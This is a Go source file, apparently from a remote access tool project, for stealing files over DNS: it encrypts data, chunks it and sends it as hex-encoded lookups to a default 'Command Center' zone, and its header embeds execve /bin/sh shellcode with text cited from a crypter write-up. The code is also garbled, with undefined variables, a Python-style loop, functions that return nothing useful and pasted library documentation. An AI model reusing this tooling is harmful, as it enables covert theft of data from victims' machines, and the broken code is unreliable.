/*/
// Copyright 2012 The Go Authors. All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

Uses code from:
https://snowscan.io/custom-crypter/

	// execve shellcode /bin/sh
	in := []byte{
		0xeb, 0x1a, 0x5e, 0x31, 0xdb, 0x88, 0x5e, 0x07,
		0x89, 0x76, 0x08, 0x89, 0x5e, 0x0c, 0x8d, 0x1e,
		0x8d, 0x4e, 0x08, 0x8d, 0x56, 0x0c, 0x31, 0xc0,
		0xb0, 0x0b, 0xcd, 0x80, 0xe8, 0xe1, 0xff, 0xff,
		0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
		0x41, 0x42, 0x42, 0x42, 0x42, 0x43, 0x43, 0x43,
		0x43}

	out := make([]byte, len(in))

	// Generate a random 24 bytes nonce
	nonce := make([]byte, 24)
	if _, err := rand.Read(nonce); err != nil {
		panic(err)
	}

It is the caller's responsibility to ensure the uniqueness of nonces—for
example, by using nonce 1 for the first message, nonce 2 for the second
message, etc. Nonces are long enough that randomly generated nonces have
negligible risk of collision.

Messages should be small because:
	1. The whole message needs to be held in memory to be processed.

	2. Using large messages pressures implementations on small machines to decrypt
		and process plaintext before authenticating it. This is very dangerous, and
		this API does not allow it, but a protocol that uses excessive message sizes
		might present some implementations with no other choice.

var	3. Fixed overheads will be sufficiently amortised by messages as small as 8KB.

	4. Performance may be improved by working with messages that fit into data caches.
		Thus large amounts of data should be chunked so that each message is small.
		(Each message still needs a unique nonce.) If in doubt, 16KB is a reasonable
		chunk size.
/*/

package dnsexfiltration

import (
	"bytes"
	"compress/zlib"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"go_rat/pkg/shared_code/ErrorHandling"
	"io"
	"net"
	"os"

	"golang.org/x/crypto/chacha20poly1305"
)

// bytes per read operation
var FILEREADSPEED int = 36

// function to use zlib to compress a byte array
func ZCompress(input []byte) (herp bytes.Buffer, derp error) {
	var b bytes.Buffer
	// feed the writer a buffer
	w := zlib.NewWriter(&b)
	// and the Write method will copy data to that buffer
	// in this case, the input we provide gets copied into the buffer "b"
	w.Write(input)
	// and then we close the connection
	w.Close()
	// and copy the buffer to the output
	//copy(herp, b.Bytes())
	return herp, derp
}
func ZDecompress(DataIn []byte) {
	var buff []byte
	b := bytes.NewReader(buff)
	r, derp := zlib.NewReader(b)
	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
	}
	io.Copy(os.Stdout, r)
	r.Close()
}
func OpenFile() {

}

// This function creates a nonce
func NonceGenerator() (nonce []byte, derp error) {
	//var n *big.Int
	//bitsize := big.NewInt(24)
	//nonce = make([]byte, 24)
	nonce := make([]byte, chacha20poly1305.NonceSizeX)
	// make random 24 bit prime number
	n, derp := rand.Int(rand.Reader, bitsize)
	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
	}
	//copy number into buffer
	// after converting bigint to byte with internal method
	copy(nonce, n.Bytes())
	return nonce, derp
}

// makes chunky data for packet stuffing
// chunk size known, number of packets unknown
func DataChunkerChunkSize(DataIn []byte, chunkSize int) [][]byte { //, derp error) {
	//var chunkcount int = 1
	var DataInLength = len(DataIn)
	// make the buffer
	DataOutBuffer := make([][]byte, DataInLength)
	// loop over the original data object taking a bite outta crim... uh data
	for asdf := 1; asdf < DataInLength; asdf += chunkSize { //chunkcount++{
		// mark the end bounds
		//asdf= 2 ; end = 52? wat
		end := asdf + chunkSize
		// necessary check to avoid slicing beyond
		// slice capacity
		if end > DataInLength {
			end = DataInLength
		}
		DataOutBuffer = append(DataOutBuffer, DataIn[asdf:chunkSize])

	}

	return DataOutBuffer
	//maybe return chunk_num int as well
}

// This function uses the Salsa20 to encrypt a byte field
// with a variable sized nonce
func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (Salsa []byte, derp error) {
	var key [32]byte
	out := make([]byte, len(bytes_in))
	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
	}
	// I was advised not to make my own unless I was a professional mathermind
	// this is the easy cheater way, use someone elses work

	pass := "Hello"
	msg := "Pass"

	argCount := len(os.Args[1:])

	if argCount > 0 {
		msg = string(os.Args[1])
	}
	if argCount > 1 {
		pass = string(os.Args[2])
	}

	key := sha256.Sum256([]byte(pass))
	aead, _ := chacha20poly1305.NewX(key[:])

	if pass == "" {
		a := make([]byte, 32)
		copy(key[:32], a[:32])
		aead, _ = chacha20poly1305.NewX(a)
	}
	if msg == "" {
		a := make([]byte, 32)
		msg = string(a)

	}

	nonce := make([]byte, chacha20poly1305.NonceSizeX)

	ciphertext := aead.Seal(nil, nonce, []byte(msg), nil)

	plaintext, _ := aead.Open(nil, nonce, ciphertext, nil)

	copy(Salsa, out)
	for _, element := range out {
		// original code treated this like a nullbyte but wat?
		if element == 0 {
			ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
			//return
		}
	}
	return Salsa, derp
}
func sendDNSmessage(MsgAsHexStr string, DestZone string) {
	var debug bool = true
	//a unique marker to identify the file in the dns logs
	var marker string = "herpAderpNotAPerp"
	// the dns zone to send the queries to.
	hostname := fmt.Sprintf("%d.%s.1.%s.%s", marker, MsgAsHexStr, DestZone)
	herp, derp := net.LookupIP(hostname)
	fmt.Printf("%d\n", chunk)
	if debug {
		fmt.Printf("Data Length: %d\n")
		fmt.Printf("Error: %s\n", derp)
		fmt.Printf("--------------------------\n")
	}

}
func DnsReceiver() {

}

// Exports a sequence of bytes via DNS packets
// max message size should be below 63 but 5 ... I guess?
// 63 is total available per packet I think
func DNSExfiltration(ByteArrayInput []byte, DestZone string, MaxMsgSize int) (herp, derp error) {
	//var debug bool = true
	//the local file to exfiltrate.
	//var file []byte = ByteArrayInput
	// the dns zone to send the queries to.
	DestZone = ""
	MaxMsgSize = 512 // bytes
	chunksofdata := DataChunkerChunkSize(ByteArrayInput, MaxMsgSize)

	for thing in chunksofdata {
		hexString := hex.EncodeToString(dataBytes)
		sendDNSmessage(hexString, DestZone)
	}

}

func main() {
	var debug = flag.Bool("d", false, "enable debugging.")
	var file = flag.String("file", "", "the local file to exfiltrate.")
	var help = flag.Bool("help", false, "show help.")
	var DerpKey = flag.String("key", "Herp-Key-Derp")
	var CommandCenter = flag.String("Command Center", "hakcbiscuits.firewall-gateway.netyinski", "the dns zone (homebase) to send the queries to.")

	flag.Parse()

	if *help || len(os.Args) == 1 {
		flag.PrintDefaults()
		return
	}
}
